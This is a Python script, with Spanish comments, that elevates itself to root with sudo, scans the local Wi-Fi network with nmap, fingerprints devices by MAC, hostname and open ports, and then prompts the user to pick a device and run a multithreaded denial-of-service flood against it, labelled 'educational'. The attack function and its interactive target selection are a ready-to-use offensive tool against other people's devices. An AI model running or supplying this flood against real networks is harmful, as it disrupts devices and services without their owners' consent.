import os
import sys
import subprocess
import requests
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.console import Console
from time import sleep
import socket
import threading

# Logo de "Red Hat" tipo puntillismo ASCII
logo = '''
      .  .  .  .  .  .  .  .  .  
 .       .    .   .  .      .  .
    .      * . .  .  .  .  .
 .   . * * * * * * * * * . .
.  * * * * * * * * * * *  .
 . * * * * * * * * * * * .
    . * * * * * * * * .
      .  * * * * * .
         .  *  .
'''

console = Console()

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_network_cidr(ip):
    # Asume red /24
    return '.'.join(ip.split('.')[:3]) + '.0/24'

def scan_network(network):
    # Uso de nmap para escaneo agresivo (detecta TODO lo posible)
    try:
        result = subprocess.check_output(
            ['nmap', '-sn', '-PE', '-PA21,23,80,3389', network],
            universal_newlines=True
        )
        return result
    except Exception as e:
        return ""

def get_hostnames(ip_list):
    # Intenta obtener el hostname de cada IP vía reverse DNS
    hostnames = {}
    for ip in ip_list:
        try:
            hostnames[ip] = socket.gethostbyaddr(ip)[0]
        except Exception:
            hostnames[ip] = None
    return hostnames

def extract_devices(nmap_output):
    devices = []
    lines = nmap_output.split('\n')
    current_device = {}
    for line in lines:
        if 'Nmap scan report for' in line:
            if current_device:
                devices.append(current_device)
            current_device = {'ip': line.split()[-1]}
        if 'MAC Address:' in line:
            parts = line.split('MAC Address: ')[1].split(' ')
            current_device['mac'] = parts[0]
            if len(parts) > 1:
                current_device['vendor'] = ' '.join(parts[1:]).strip('() ')
    if current_device:
        devices.append(current_device)
    return devices

def get_ports(ip):
    # Escaneo rápido de puertos (puede tardar si hay muchos dispositivos)
    try:
        result = subprocess.check_output(
            ['nmap', '-p', '22,23,80,443,554,515,9100,8000,8080', '--open', ip],
            universal_newlines=True
        )
        open_ports = []
        for line in result.splitlines():
            if '/tcp' in line and 'open' in line:
                port = int(line.split('/')[0])
                open_ports.append(port)
        return open_ports
    except Exception:
        return []

def predict_vendor(mac, hostname=None, open_ports=None):
    # Consulta API de macvendors
    try:
        resp = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
        if resp.status_code == 200 and resp.text and resp.text != "Not Found":
            return resp.text
    except:
        pass

    # Heurística con hostname
    if hostname:
        h = hostname.lower()
        if "iphone" in h or "ipad" in h:
            return "Apple"
        if "android" in h:
            return "Android"
        if "hp" in h:
            return "HP"
        if "samsung" in h:
            return "Samsung"
        if "huawei" in h:
            return "Huawei"
        if "xiaomi" in h:
            return "Xiaomi"
        if "printer" in h or "impresora" in h:
            return "Impresora"
        if "camera" in h or "camara" in h:
            return "Cámara"

    # Heurística por puertos abiertos
    if open_ports:
        if 9100 in open_ports or 515 in open_ports:
            return "Impresora (posiblemente HP/Canon/Epson)"
        if 554 in open_ports:
            return "Cámara IP"
        if 80 in open_ports and 8080 in open_ports:
            return "Dispositivo IoT/Web server"

    return "Desconocido"

def dos_attack(target_ip, target_port=80, duration=10, threads=50):
    import random
    import time
    console.print(f"[bold red]Iniciando ataque de denegación de servicio (DoS) educativo a {target_ip}:{target_port} por {duration} segundos...[/bold red]")
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        end = time.time() + duration
        while time.time() < end:
            try:
                sock.connect((target_ip, target_port))
                sock.sendto(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % target_ip.encode(), (target_ip, target_port))
            except:
                pass
        sock.close()
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        thread_list.append(t)
        t.start()
    for t in thread_list:
        t.join()
    console.print("[bold green]Ataque finalizado (educativo).[/bold green]")

def main():
    # Auto-elevación a root si no lo es
    try:
        if os.name != 'nt' and os.geteuid() != 0:
            print("Elevando privilegios con sudo...")
            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)
    except AttributeError:
        pass  # os.geteuid no existe en Windows

    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(logo, style="bold red")
    console.print("[bold cyan]Escaneo profundo de dispositivos conectados al WiFi...[/bold cyan]\n")
    ip = get_local_ip()
    network = get_network_cidr(ip)
    
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn(),
    ) as progress:
        task = progress.add_task("Escaneando la red...", total=100)
        for i in range(0, 100, 10):
            sleep(0.06)
            progress.update(task, advance=10)
        nmap_output = scan_network(network)
        progress.update(task, completed=100)
        sleep(0.5)

    devices = extract_devices(nmap_output)
    if not devices:
        console.print("[bold red]No se encontraron dispositivos.[/bold red]")
        sys.exit(1)

    # Obtener hostnames
    ip_list = [dev['ip'] for dev in devices]
    hostnames = get_hostnames(ip_list)

    console.print("\n[bold yellow]Dispositivos encontrados:[/bold yellow]")

    for idx, dev in enumerate(devices):
        mac = dev.get('mac', 'Desconocido')
        vendor = dev.get('vendor', None)
        ip = dev.get('ip')
        hostname = hostnames.get(ip, None)
        open_ports = get_ports(ip)

        # Predicción avanzada de la marca
        marca = vendor if vendor and vendor != "Unknown" else predict_vendor(mac, hostname, open_ports)
        host_txt = f", Hostname: {hostname}" if hostname else ""
        ports_txt = f", Puertos abiertos: {open_ports}" if open_ports else ""
        console.print(
            f"{idx+1}. IP: {ip}, MAC: {mac}, Marca: {marca}{host_txt}{ports_txt}, [italic gray]Credenciales/Número: No disponible (por seguridad y legalidad)[/italic gray]"
        )

    # Selección de dispositivo para ataque DoS (educativo)
    console.print("\n[bold magenta]Seleccione el número del dispositivo para realizar un ataque de denegación de servicio (educativo):[/bold magenta]")
    try:
        seleccion = int(input("Ingrese el número del dispositivo (0 para omitir): "))
        if seleccion > 0 and seleccion <= len(devices):
            objetivo_ip = devices[seleccion-1]['ip']
            ports = get_ports(objetivo_ip)
            target_port = 80
            if ports:
                print(f"Puertos abiertos detectados en el objetivo: {ports}")
                port_input = input(f"Ingrese el puerto de destino (o presione Enter para usar {target_port}): ")
                if port_input.strip().isdigit():
                    target_port = int(port_input.strip())
            dur_input = input("Duración del ataque en segundos (default 10): ")
            duration = int(dur_input.strip()) if dur_input.strip().isdigit() else 10
            th_input = input("Cantidad de hilos (default 50): ")
            threads = int(th_input.strip()) if th_input.strip().isdigit() else 50
            dos_attack(objetivo_ip, target_port, duration, threads)
        else:
            print("No se realizará ningún ataque.")
    except Exception as e:
        print(f"Opción no válida ({e}), omitiendo ataque.")

if __name__ == "__main__":
    main()